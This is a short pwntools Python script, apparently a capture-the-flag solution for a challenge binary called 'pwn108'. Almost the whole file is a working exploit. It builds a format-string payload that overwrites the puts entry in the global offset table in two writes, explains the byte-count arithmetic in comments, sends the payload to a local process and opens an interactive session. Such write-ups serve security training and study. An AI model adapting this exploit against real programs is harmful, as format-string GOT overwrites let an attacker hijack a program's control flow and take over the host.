from pwn import *

context.binary = binary = ELF("./pwn108.pwn108")
# got put : binary.got.puts
# 0x00007f9400000028 @ reloc.puts


junk = b"A" * 0x12

"""
number of bytes to write = desired value - bytes written so far

1nd write : (0x40) 64 - 0 = 64
2nd write : (0x123b) 4667 - 64 = 4603
"""

payload = b"%64X%13$n" + b"%4603X%14hnAAAAAAAA" + p64(binary.got.puts+2) + p64(binary.got.puts)

"""
# debugging the payload
# r2 -D stdin=payload.txt -A pwn108.pwn108

with open("payload.txt", "wb") as f:
	write_ = junk + payload
	f.write(write_)
	f.close()
"""


p = process("./pwn108.pwn108")
p.send(junk)
p.send(payload)
p.interactive()
